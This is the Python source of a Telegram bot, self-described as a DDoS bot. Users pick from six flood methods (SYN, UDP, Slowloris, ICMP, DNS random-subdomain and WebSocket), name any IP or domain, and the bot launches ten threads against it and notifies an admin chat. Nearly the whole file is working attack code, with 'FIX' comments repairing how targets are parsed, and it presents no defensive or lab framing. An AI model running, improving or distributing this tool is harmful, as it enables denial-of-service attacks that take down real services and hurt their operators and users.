import telebot
import subprocess
import socket
import sys
import random
import threading
import time
from scapy.all import IP, TCP, UDP, ICMP, send, raw
from telebot import types
import os

TOKEN = ""
ADMIN_CHAT_ID = ""
MAX_PACKETS = 1000000

bot = telebot.TeleBot(TOKEN)
user_attacks = {}

ATTACK_METHODS = {
    "1": "SYN Flood (Layer 4 Tsunami)",
    "2": "UDP Amplification (Bandwidth Annihilator)",
    "3": "HTTP Slowloris (Connection Strangler)",
    "4": "ICMP Ping Storm (Packet Hurricane)",
    "5": "DNS Water Torture (NXDomain Overload)",
    "6": "WebSocket Armageddon (Layer 7 Apocalypse)"
}


# ===== ATTACK FUNCTIONS =====

def syn_flood(target_ip, target_port):
    """TCP SYN Flood"""
    packet_count = 0
    while packet_count < MAX_PACKETS:
        try:
            ip = IP(dst=target_ip)
            tcp = TCP(
                sport=random.randint(1024, 65535),
                dport=target_port,
                flags="S",
                seq=random.randint(0, 4294967295),
                window=64240
            )
            send(ip / tcp, verbose=0)
            packet_count += 1
        except Exception as e:
            print(f"SYN Flood Error: {str(e)}", file=sys.stderr)
            break


# ==========================================
# FIX: UDP function now takes ip AND port
# as separate arguments, validates the IP
# before calling sendto()
# ==========================================
def udp_amplification(target_ip, target_port=53):
    """UDP flood attack vector"""
    packet_count = 0
    while packet_count < MAX_PACKETS:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = bytes(random.getrandbits(8) for _ in range(1024))

            # Send directly to the target IP and port
            sock.sendto(payload, (target_ip, target_port))
            sock.close()
            packet_count += 1
        except Exception as e:
            print(f"UDP Error: {str(e)}", file=sys.stderr)
            break


def slowloris(target_ip, target_port=80):
    """Slow HTTP Denial of Service"""
    sockets_list = []
    max_sockets = 200

    for _ in range(max_sockets):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target_ip}\r\n".encode())
            s.send("User-Agent: Mozilla/5.0\r\n".encode())
            s.send("Connection: keep-alive\r\n".encode())
            sockets_list.append(s)
        except Exception as e:
            print(f"Slowloris Connect Error: {str(e)}", file=sys.stderr)

    keep_alive_rounds = 100
    for _ in range(keep_alive_rounds):
        for s in list(sockets_list):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
            except Exception:
                sockets_list.remove(s)
                try:
                    new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new_s.settimeout(4)
                    new_s.connect((target_ip, target_port))
                    new_s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
                    new_s.send(f"Host: {target_ip}\r\n".encode())
                    sockets_list.append(new_s)
                except Exception:
                    pass
        time.sleep(10)

    for s in sockets_list:
        try:
            s.close()
        except Exception:
            pass


def icmp_ping_storm(target_ip, target_port=0):
    """Ping flood (port ignored for ICMP)"""
    try:
        if sys.platform == "win32":
            cmd = ["ping", target_ip, "-n", "100", "-w", "1000"]
        else:
            cmd = ["ping", target_ip, "-c", "100", "-W", "1"]
        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL)
    except subprocess.CalledProcessError as e:
        print(f"ICMP error: {e}", file=sys.stderr)


def dns_nxdomain_attack(target_ip, target_port=53):
    """DNS query flood"""
    query_count = 0
    while query_count < 10000:
        try:
            random_sub = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=12))
            query = f"{random_sub}.{target_ip}"
            subprocess.run(
                ["nslookup", query],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=5
            )
            query_count += 1
        except subprocess.TimeoutExpired:
            continue
        except Exception as e:
            print(f"DNS Error: {str(e)}", file=sys.stderr)
            break


def websocket_apocalypse(target_ip, target_port=80):
    """WebSocket connection flood"""
    try:
        from websocket import create_connection
    except ImportError:
        print("Install websocket-client: pip install websocket-client", file=sys.stderr)
        return

    count = 0
    while count < 1000:
        try:
            ws = create_connection(f"ws://{target_ip}:{target_port}/", timeout=5)
            ws.send("0" * 1024 * 1024)
            ws.close()
            count += 1
        except Exception as e:
            print(f"WebSocket Error: {str(e)}", file=sys.stderr)
            time.sleep(0.1)


# ==========================================
# FIX: All lambdas now pass BOTH ip and port
# ==========================================
attack_functions = {
    '1': lambda ip, port: syn_flood(ip, port),
    '2': lambda ip, port: udp_amplification(ip, port),
    '3': lambda ip, port: slowloris(ip, port),
    '4': lambda ip, port: icmp_ping_storm(ip, port),
    '5': lambda ip, port: dns_nxdomain_attack(ip, port),
    '6': lambda ip, port: websocket_apocalypse(ip, port)
}

# Default ports for each method
DEFAULT_PORTS = {
    '1': 80,
    '2': 53,
    '3': 80,
    '4': 0,
    '5': 53,
    '6': 80
}


def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False


# ===== TELEGRAM HANDLERS =====

@bot.message_handler(commands=['start'])
def show_attack_menu(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    for num, desc in ATTACK_METHODS.items():
        markup.add(types.InlineKeyboardButton(
            f"{num}. {desc}",
            callback_data=f"attack_{num}")
        )
    bot.send_message(
        message.chat.id,
        "<b>⚡ PHREAK'S OFFENSIVE CONTROL PANEL ⚡</b>\n"
        "Select attack vector:\n\n"
        "1. SYN: TCP connection exhaustion\n"
        "2. UDP: Bandwidth amplification\n"
        "3. Slowloris: HTTP connection starvation\n"
        "4. ICMP: Ping flood overload\n"
        "5. DNS: Recursive query bombardment\n"
        "6. WS: WebSocket protocol abuse",
        parse_mode='HTML',
        reply_markup=markup
    )


@bot.callback_query_handler(func=lambda call: call.data.startswith('attack_'))
def set_attack_method(call):
    method_id = call.data.split('_')[1]
    if method_id not in ATTACK_METHODS:
        bot.send_message(call.message.chat.id, "❌ Invalid method!")
        return

    user_attacks[call.message.chat.id] = {'method': method_id}
    bot.answer_callback_query(call.id, "Method selected!")
    bot.send_message(
        call.message.chat.id,
        f"⛔ {ATTACK_METHODS[method_id]} SELECTED\n\n"
        "📌 Send target in one of these formats:\n"
        "• <code>IP</code>  (uses default port)\n"
        "• <code>IP PORT</code>\n"
        "• <code>domain.com</code>\n"
        "• <code>domain.com PORT</code>\n\n"
        "Example: <code>192.168.1.1 80</code>",
        parse_mode='HTML'
    )


# ==========================================
# FIX: Parse "IP PORT" input correctly
# Split the message and extract IP and port
# separately before launching attack
# ==========================================
@bot.message_handler(func=lambda m: m.chat.id in user_attacks)
def execute_attack(message):
    chat_id = message.chat.id
    user_input = message.text.strip()

    if user_input.startswith('/'):
        return

    try:
        method_id = user_attacks[chat_id]['method']

        # ==========================================
        # PARSE INPUT: split into IP and PORT
        # ==========================================
        parts = user_input.split()

        if len(parts) == 1:
            # Only IP/domain provided, use default port
            target_host = parts[0]
            target_port = DEFAULT_PORTS.get(method_id, 80)

        elif len(parts) == 2:
            # IP/domain + port provided
            target_host = parts[0]
            try:
                target_port = int(parts[1])
                if not (1 <= target_port <= 65535):
                    bot.send_message(chat_id, "❌ Port must be between 1-65535")
                    return
            except ValueError:
                bot.send_message(chat_id, "❌ Invalid port number!\n"
                                          "Use format: <code>IP PORT</code>",
                                 parse_mode='HTML')
                return
        else:
            bot.send_message(chat_id, "❌ Invalid format!\n"
                                      "Use: <code>IP PORT</code> or just <code>IP</code>",
                             parse_mode='HTML')
            return

        # ==========================================
        # RESOLVE HOSTNAME TO IP
        # ==========================================
        if is_valid_ip(target_host):
            target_ip = target_host
        else:
            try:
                target_ip = socket.gethostbyname(target_host)
            except socket.gaierror:
                bot.send_message(chat_id, f"❌ Cannot resolve hostname: {target_host}")
                del user_attacks[chat_id]
                return

        bot.send_message(
            chat_id,
            f"🚀 LAUNCHING {ATTACK_METHODS[method_id]}\n"
            f"🎯 Target: <code>{target_ip}</code>\n"
            f"🔌 Port: <code>{target_port}</code>\n"
            f"🧵 Threads: 10",
            parse_mode='HTML'
        )

        # Launch attack threads
        for _ in range(10):
            t = threading.Thread(
                target=attack_functions[method_id],
                args=(target_ip, target_port),
                daemon=True
            )
            t.start()

        bot.send_message(
            ADMIN_CHAT_ID,
            f"☠️ ATTACK DEPLOYED ☠️\n"
            f"Method: {ATTACK_METHODS[method_id]}\n"
            f"Target: {target_ip}:{target_port}\n"
            f"Origin: {message.from_user.id}"
        )

    except Exception as e:
        bot.send_message(chat_id, f"💥 ERROR: {str(e)}")
        print(f"Attack Error: {str(e)}", file=sys.stderr)
    finally:
        if chat_id in user_attacks:
            del user_attacks[chat_id]


if __name__ == "__main__":
    print("DDOS-Telegram-BOT v2 - Online")

    try:
        bot_info = bot.get_me()
        print(f"Bot connected: @{bot_info.username}")
        print(f"Admin Chat ID: {ADMIN_CHAT_ID}")
    except Exception as e:
        print(f"FATAL: Cannot connect to Telegram: {e}")
        sys.exit(1)

    bot.infinity_polling(timeout=60, long_polling_timeout=30)